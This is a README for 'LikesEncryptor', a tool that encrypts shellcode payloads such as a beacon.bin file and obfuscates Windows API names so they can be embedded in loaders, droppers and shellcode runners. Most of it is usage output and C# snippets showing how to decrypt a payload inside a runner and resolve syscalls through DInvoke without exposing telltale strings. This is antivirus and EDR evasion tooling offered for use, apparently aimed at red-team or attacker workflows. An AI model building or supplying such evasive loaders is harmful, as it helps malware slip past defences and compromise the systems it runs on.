# LikesEncryptor

Various obfuscation and decryption functionality for loaders, droppers, runners.

## Usage

```
LikesEncryptor 1.0.0.1
Copyright c  2021

  -i, --input       Required. Input file to be processed (e.g. beacon.bin).

  -m, --mode        Required. Encryption/encoding mode (aesCs,caesarCs,caesarVba,xorCs,xorCsString)

  -r, --resource    (Default: false) Output as an embeded resource file (default is copy and paste code)

  --help            Display this help screen.

  --version         Display version information
```

## Examples

### C# AES Bin Payload

The following example encrypts the bin file using AES and stores the output in a text file. The text file can be added as a resource to a runner. Remove the `-r` flag to output the encrypted blob to the console for copy and paste. 

```
PS> .\LikesEncryptor.exe -m aesCs -r -i .\beacon.bin
[>] Initializing...
[>] Mode: aesCs
[>] Input mode: bin
[>] Reading bytes from: .\beacon.bin
[>] Bytes read: 1024
[>] Output file: security.txt
[>] Copy & paste into shellcode runner
-----
byte[] iv = new byte[16] {0x30, 0xb1, 0xfb, 0x8a, 0xf8, 0xf5, 0x22, 0x41, 0x6a, 0xf1, 0xeb, 0xda, 0x29, 0xd7, 0x98, 0xb5};
byte[] key = new byte[32] {0xc1, 0x00, 0xb7, 0x66, 0x82, 0x6a, 0xe1, 0x84, 0x89, 0x50, 0xe9, 0xae, 0xd5, 0xa8, 0xf2, 0x57, 0x62, 0x90, 0x20, 0xb2, 0x57, 0xa9, 0xa9, 0xa5, 0x79, 0x18, 0x01, 0x70, 0x59, 0xfb, 0x4f, 0x37};
-----
[>] Thanks to @xct_de
```

An example decryption routine can be found in the [DecryptAesCsharpBytes.cs](./LikesEncryptor/Templates/DecryptAesCsharpBytes.cs) template. Copy the `iv` and `key` strings into the runner and decrypt:

```
static void Main(string[] args)
{
    [...]
    byte[] iv = new byte[16] { 0x30, 0xb1, 0xfb, 0x8a, 0xf8, 0xf5, 0x22, 0x41, 0x6a, 0xf1, 0xeb, 0xda, 0x29, 0xd7, 0x98, 0xb5 };
    byte[] key = new byte[32] { 0xe6, 0xd6, 0x69, 0x4e, 0x5b, 0x01, 0xd2, 0xb0, 0xf8, 0x43, 0xe0, 0x3f, 0xd9, 0xc8, 0x6f, 0x9c, 0x2a, 0x04, 0x50, 0x42, 0x65, 0x3b, 0xdb, 0xcb, 0x12, 0x92, 0xd8, 0xa6, 0x0a, 0x0d, 0x2d, 0x44 };

    byte[] buf = Decrypt(encrypted, key, iv);
    [...]
}
```

### C# XOR String

Perform string obfuscation:

```
PS> .\LikesEncryptor.exe -m xorCsString -i NtAllocateVirtualMemory
[>] Initializing...
[>] Mode: xorCsString
[>] Input mode: string
[>] Encrypting string: NtAllocateVirtualMemory
[>] encrypting 1 entries
[>] key: 0x45, 0x59, 0x54, 0x38, 0x4a, 0x64, 0x71, 0x57, 0x57, 0x70, 0x4a, 0x70, 0x49, 0x47, 0x43, 0x52, 0x31, 0x34, 0x33, 0x46, 0x77, 0x6a, 0x45, 0x41, 0x63, 0x58, 0x47, 0x4c
[>] exec stub:

//  NtAllocateVirtualMemory
LikesEvasion.Evade.Deflate(LikesEvasion.Evade.FromHex("0b2d1554260b123623151c193b3336335d79562b18183c"),LikesEvasion.Evade.FromHex("455954384a64715757704a704947435231343346776a45416358474c"));
```

Next, add the decryption routine to a program. An example decryption routine can be found in the [DecryptXorCsharpString.cs](./LikesEncryptor/Templates/DecryptXorCsharpString.cs) template. Example decryption:

```
static void Main(string[] args)
{
    Console.WriteLine(LikesEvasion.Evade.Deflate(LikesEvasion.Evade.FromHex("0b2d1554260b123623151c193b3336335d79562b18183c"), LikesEvasion.Evade.FromHex("455954384a64715757704a704947435231343346776a45416358474c")));
    
}
```

PoC output:

```
PS> .\PocXorStub.exe
NtAllocateVirtualMemory
```

Usage with DInvoke example:

```
static void Main(string[] args)
{
    [...]
    IntPtr syscall = DInvoke.DynamicInvoke.Generic.GetSyscallStub(LikesEvasion.Evade.Deflate(LikesEvasion.Evade.FromHex("0b2d1554260b123623151c193b3336335d79562b18183c"), LikesEvasion.Evade.FromHex("455954384a64715757704a704947435231343346776a45416358474c")));
    DInvoke.DynamicInvoke.Native.DELEGATES.NtAllocateVirtualMemory syscallAllocateVirtualMemory = (DInvoke.DynamicInvoke.Native.DELEGATES.NtAllocateVirtualMemory)Marshal.GetDelegateForFunctionPointer(syscall, typeof(DInvoke.DynamicInvoke.Native.DELEGATES.NtAllocateVirtualMemory));
    [...]
}
```